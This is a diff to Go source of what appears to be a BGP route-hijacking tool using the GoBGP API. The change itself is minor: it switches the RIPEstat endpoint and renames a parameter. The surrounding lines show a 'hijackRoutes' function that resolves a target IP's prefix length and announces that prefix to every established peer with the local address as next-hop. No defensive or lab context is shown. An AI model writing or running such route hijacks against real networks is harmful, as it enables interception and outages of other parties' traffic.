@@ -29,7 +29,7 @@ type RipeResponse struct {
 
 func getCurrentPrefixLengthFromRipe(ip string) (uint32, error) {
 	// Construct the API URL
-	url := fmt.Sprintf("https://stat.ripe.net/data/bgp-state/data.json?resource=%s", ip)
+	url := fmt.Sprintf("https://stat.ripe.net/data/prefix-overview/data.json?resource=%s", ip)
 
 	// Make the HTTP request
 	resp, err := http.Get(url)
@@ -148,7 +148,7 @@ func determinePrefixLength(ip string) (uint32, error) {
 	return 0, fmt.Errorf("invalid IP address format: %s", ip)
 }
 
-func hijackRoutes(client api.GobgpApiClient, ctx context.Context, targetIP string, prefixLenOverride ...uint32) error {
+func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, prefixLenOverride ...uint32) error {
 	// Using automatic prefix length determination
 	// hijackRoutes(client, ctx, "192.168.1.0")
 	// Using a specific prefix length
@@ -166,7 +166,7 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, targetIP strin
 	if len(prefixLenOverride) > 0 {
 		prefixLen = prefixLenOverride[0]
 	} else {
-		prefixLen, err2 = determinePrefixLength(targetIP)
+		prefixLen, err2 = determinePrefixLength(ip)
 		if err2 != nil {
 			return fmt.Errorf("failed to determine prefix length: %v", err2)
 		}
@@ -184,7 +184,7 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, targetIP strin
 			peer.Peer.State.SessionState)
 
 		// Add a new route using our local address as next-hop
-		err = addRoute(client, ctx, targetIP, prefixLen, peer.Peer.Transport.LocalAddress)
+		err = addRoute(client, ctx, ip, prefixLen, peer.Peer.Transport.LocalAddress)
 		if err != nil {
 			return fmt.Errorf("failed to add route to %s: %v", peer.Peer.Conf.NeighborAddress, err)
 		}
